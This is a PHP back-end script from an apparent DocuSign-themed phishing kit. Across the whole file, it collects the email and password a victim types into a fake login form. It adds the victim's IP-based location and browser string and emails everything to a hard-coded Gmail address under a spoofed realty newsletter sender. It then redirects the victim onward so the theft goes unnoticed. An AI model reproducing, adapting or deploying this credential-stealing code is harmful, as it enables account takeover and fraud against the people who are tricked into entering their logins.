<?php

require_once('geoplugin.class.php');

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 


$msg = "--------------< Solution Inc - Rsult>-----------------------------\n";
$msg .= "Docusign By 4gb4\n";
$msg .= "-----------------< DB Access >---------------------------\n";
$msg .= "Email: ".$_POST['emazz']."\n";
$msg .= "Password: ".$_POST['pswdd']."\n";
$msg .= "--------------------< IP-ADD >---------------------------------\n";
$msg .= "IP : " .$ip. "\n";
$msg .= "-------------------------------------------------------\n";
$msg .= 	"City: {$geoplugin->city}\n";
$msg .= 	"Region: {$geoplugin->region}\n";
$msg .= 	"Country Name: {$geoplugin->countryName}\n";
$msg .= 	"Country Code: {$geoplugin->countryCode}\n";
$msg .= "USER-WEB-BROWSER: '$browser'\n";
$msg .= "-------------< 2017 GBA Inc. >-----------------------------\n";

if($_POST['allthere']=="ott") {
	$subject=" $state RST From Others";
}
if($_POST['offline']=="off") {
	$subject=" $state RST From  Of.f.i.ce";
}
if($_POST['hall']=="alone") {
	$subject=" $state RST From  A.o.I";
}
if($_POST['youth']=="york") {
	$subject=" $state RST From  YM";
}


$to = "gabphens0717@gmail.com";
$from = "From: Texas Realty<newsletter@ymgoods.com>";
mail($to,$subject,$msg,$from);

?>
<script type="text/javascript"> 
<!-- 
   window.location="one.php?season_rev&ce=realm4nMcne=flye&ne<?php echo uniqid(); ?>"

</script> 
<?php	

  ?> 
<script type="text/javascript">

</script> 
<?php	
fclose($handle); 
exit; 
?> 